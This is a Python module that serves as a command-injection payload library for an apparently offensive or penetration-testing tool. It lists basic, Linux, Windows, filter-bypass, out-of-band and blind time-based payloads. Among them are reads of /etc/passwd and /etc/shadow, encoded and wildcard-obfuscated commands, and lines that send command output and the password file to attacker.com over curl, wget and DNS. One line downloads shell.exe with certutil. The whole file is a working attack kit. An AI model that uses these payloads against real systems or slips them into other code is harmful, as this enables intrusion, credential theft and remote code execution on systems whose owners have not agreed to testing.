"""RCE命令注入Payload库 - 70+ Payloads"""

RCE_BASIC = [
    "; id",
    "| id",
    "|| id",
    "&& id",
    "& id",
    "`id`",
    "$(id)",
    "\nid",
    "%0aid",
    "%0did",
    "%0a%0did",
    "; whoami",
    "| whoami",
    "$(whoami)",
    "`whoami`",
]

RCE_LINUX = [
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; ls -la",
    "; pwd",
    "; uname -a",
    "; id; whoami; uname -a",
    "; ps aux",
    "; netstat -an",
    "; ifconfig",
    "; ip addr",
    "; curl http://attacker.com/",
    "; wget http://attacker.com/",
    "; ping -c 1 attacker.com",
    "; nslookup attacker.com",
    "; dig attacker.com",
    "; cat /etc/shadow",
    "; head /etc/passwd",
    "; tail -n 50 /var/log/auth.log",
    "; env",
    "; printenv",
    "; set",
    "; history",
    "; w",
    "; last",
    "; crontab -l",
]

RCE_WINDOWS = [
    "& whoami",
    "| whoami",
    "; whoami",
    "& hostname",
    "& ipconfig",
    "& ipconfig /all",
    "& dir",
    "& dir C:\\",
    "& type C:\\windows\\win.ini",
    "& net user",
    "& net localgroup administrators",
    "& systeminfo",
    "& tasklist",
    "& netstat -an",
    "& set",
    "; powershell -c whoami",
    "& powershell -c \"Get-Process\"",
    "& powershell -enc BASE64_PAYLOAD",
    "& certutil -urlcache -split -f http://attacker.com/shell.exe",
    "& reg query HKLM\\SOFTWARE",
]

RCE_BYPASS = [
    # 空格绕过
    ";{id}",
    ";id\t",
    ";$IFS$9id",
    ";${IFS}id",
    ";id$IFS",
    ";id%09",
    ";id%0a",
    ";id<>",
    # 命令绕过
    ";/bin/cat /etc/passwd",
    ";/???/??t /???/p??s??",  # /bin/cat /etc/passwd
    ";c'a't /etc/passwd",
    ';c"a"t /etc/passwd',
    ";c\\at /etc/passwd",
    ";ca$@t /etc/passwd",
    # 编码绕过
    ";echo aWQ=|base64 -d|sh",
    ";echo 6964|xxd -r -p|sh",
    ';echo "di" | rev | sh',
    ";printf '\\x69\\x64'|sh",
    # 通配符
    ";/b?n/cat /e?c/p?ss??",
    ";/b[i]n/ca[t] /et[c]/pas[s]wd",
    # 变量绕过
    ";a]id${a]",
    ";$u$n$a$m$e",
]

RCE_OOB = [
    "; curl http://attacker.com/$(whoami)",
    "; wget http://attacker.com/$(id|base64)",
    "; ping -c 1 $(whoami).attacker.com",
    "; nslookup $(whoami).attacker.com",
    "; dig $(whoami).attacker.com",
    "; curl http://attacker.com/?d=$(cat /etc/passwd|base64)",
    "| curl http://attacker.com/ -d @/etc/passwd",
]

RCE_BLIND = [
    "; sleep 5",
    "| sleep 5",
    "; ping -c 5 127.0.0.1",
    "&& sleep 5",
    "|| sleep 5",
    "; timeout 5 sleep 10",
]

ALL_RCE = RCE_BASIC + RCE_LINUX + RCE_WINDOWS + RCE_BYPASS + RCE_OOB + RCE_BLIND
